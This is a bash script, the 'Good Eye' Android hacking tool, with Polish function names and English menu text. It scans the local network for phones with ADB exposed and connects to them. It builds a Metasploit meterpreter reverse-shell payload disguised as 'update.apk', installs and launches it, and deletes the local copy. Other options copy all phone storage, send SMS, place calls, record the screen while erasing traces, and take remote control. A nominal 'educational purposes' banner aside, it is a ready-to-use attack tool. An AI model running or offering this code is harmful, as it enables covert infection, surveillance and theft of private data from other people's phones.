#!/bin/bash

# NOTE: only messages in script were translated. functions and variables are still in Polish.

IP_brama="$(ip route | grep via | awk '{print$3}')"
Moje_IP="$(ifconfig | grep 192 | awk '{print$2}')"
UE="$(adb devices | grep 1 | awk {'print$1'})"


przygotuj_srodowisko()
{	
	sudo apt-get install android-tools-adb
	sudo apt-get install scrcpy 
	adb tcpip 5555
	clear
	sudo ./goodeye.sh
}



pokaz_dostepne_cele()
{	
	echo -e "\e[35m The available targets on your network are: \e[0m"
	sudo nmap -sP $IP_brama/24 | grep 'report' | awk '{print$5$6}'
	sudo ./goodeye.sh
}

polacz_z_celem()
{
	sudo nmap -sP $IP_brama/24 | grep 'report' | awk '{print$5$6}'	
	echo "Provide the target's IP address."
	read cel
	sudo adb connect $cel:5555
	sudo ./goodeye.sh
}

podlaczone_cele()
{
	sudo adb devices
	sudo ./goodeye.sh
}

reboot_celu()
{
	sudo adb reboot 
	clear
	sudo ./goodeye.sh
}

generuj_ladunek()
{	
	echo " Provide IP to communication"
	read R_Moje_IP
	echo " Provide port to communication"
	read R_PORT
	msfvenom --platform Android --arch dalvik -p android/meterpreter/reverse_tcp LHOST=$R_Moje_IP LPORT=$R_PORT R > update.apk
	clear
	echo " Payload generated. "
	sudo ./goodeye.sh
}

zaladuj_ladunek_do_celu()

{
	adb -s $UE install update.apk
	clear
	echo " Payload loaded into smartphone. "
	sleep 2
	echo " Deleting payload from computer. "
	sudo rm update.apk
	sudo ./goodeye.sh
	
}

uruchom_ladunek()
{

	adb shell am start -n com.metasploit.stage/com.metasploit.stage.MainActivity
	sudo ./goodeye.sh
}

sciagnij_zdjecia()
{
	adb pull /sdcard /home/kali/Desktop
	sudo chmod 777 sdcard
	sudo ./goodeye.sh
}

wyslij_SMS()
{	
	clear
	echo " Specify phone number ex. +48000000000"
	read phone
	echo " Specify message to send. "
	read message
	adb shell service call isms 7 i32 0 s16 "com.android.mms.service" s16 "$phone" s16 "null" s16 "'$message'" s16 "null" s16 "null"
	sudo ./goodeye.sh
}

nagraj_ekran()
{
	echo " Provide the name of recording output file. "
	read file_name
	echo " Provide the time of recording in seconds. (max 180s) "
	read time 
	adb shell screenrecord /sdcard/$file_name.mp4 --time-limit $time
	echo "Downloading file..."
	adb pull /sdcard/$file_name.mp4
	echo "Deleting file from device..."
	adb shell rm /sdcard/$file_name.mp4
	sudo chmod 777 $file_name.mp4
	sudo ./goodeye.sh
}

otworz_strone()
{
	echo " Provide the website addres to open on device. for example: www.google.com "
	read website
	adb shell input keyevent 82
	sleep 2
	adb shell am start -a android.intent.action.VIEW -d $website
	sudo ./goodeye.sh
}

rozlacz_devices()
{
	adb disconnect
	sudo ./goodeye.sh
}

zaladuj_i_uruchom_dzwiek()
{	
	echo " Specify the path to the file ex. /home/kali/Desktop/test.wav"
	read sciezka
	echo "Specify the name of the file ex. test.wav"
	read nazwa_pliku 
	adb push $sciezka /sdcard
	adb shell am start -a android.intent.action.VIEW -d file:///sdcard/$nazwa_pliku -t video/wav
	adb shell rm sdcard/$nazwa_pliku
	sudo ./goodeye.sh

}
zdalne_sterowanie()

{
	scrcpy --tcpip=$UE
	sudo ./goodeye.sh
}

zadzwon_na_tel()
{
	echo " Provide the phone number to call. ex. +48000000000"
	read numer_telefonu_zadzwon
	adb shell am start -a android.intent.action.CALL -d tel:$numer_telefonu_zadzwon
	sudo ./goodeye.sh
}

figlet GOOD EYE
echo "Hacking Android has never been so easy."

echo "|---------------------------------|"
echo "| Made by Przemyslaw Szmaj        |"
echo "| Translated by sxnvte            |"
echo "| INSTAGRAM: _h4ker               |"
echo "| WEBSITE: www.ehaker.pl          |"
echo "| Good Eye, version 1.3           |"
echo "| The tool created for            |"
echo "| EDUCATIONAL purposes.           |"
echo "|---------------------------------|"


echo " "
echo "CONNECTED TO: " 
adb devices | awk '{print$1}'


echo ""
echo -e " [00]  \e[31m Disconnect devices \e[0m"
echo -e " [01]  \e[31m Prepare the environment \e[0m"	
echo -e " [02]  \e[31m Show available targets on the network \e[0m"
echo -e " [03]  \e[31m Show connected targets \e[0m"
echo -e " [04]  \e[31m Connect to target \e[0m"
echo -e " [05]  \e[31m Reboot target \e[0m"
echo -e " [06]  \e[31m Generate payload to infect target \e[0m"
echo -e " [07]  \e[31m Upload payload to target \e[0m"
echo -e " [08]  \e[31m Run payload on the phone and take control \e[0m"
echo -e " [09]  \e[31m Download all files from the phone \e[0m"
echo -e " [10]  \e[31m Send an SMS message \e[0m"
echo -e " [11]  \e[31m Record smartphone screen and erase traces \e[0m"
echo -e " [12]  \e[31m Open a website on the device \e[0m "
echo -e " [13]  \e[31m Load a music file and play it on the smartphone \e[0m "
echo -e " [14]  \e[31m Remote control of the smartphone \e[0m "
echo -e " [15]  \e[31m Remotely call a phone number \e[0m "




read opcja
case "$opcja" in

  "00") rozlacz_devices ;; 
  "01") przygotuj_srodowisko ;;
  "02") pokaz_dostepne_cele ;;
  "03") podlaczone_cele ;;
  "04") polacz_z_celem ;;
  "05") reboot_celu ;;
  "06") generuj_ladunek ;;
  "07") zaladuj_ladunek_do_celu ;;
  "08") uruchom_ladunek ;;
  "09") sciagnij_zdjecia ;;
  "10") wyslij_SMS ;;
  "11") nagraj_ekran ;;
  "12") otworz_strone ;;  
  "13") zaladuj_i_uruchom_dzwiek ;;
  "14") zdalne_sterowanie ;;
  "15") zadzwon_na_tel ;;

  



  *) clear && ./goodeye.sh
  
esac
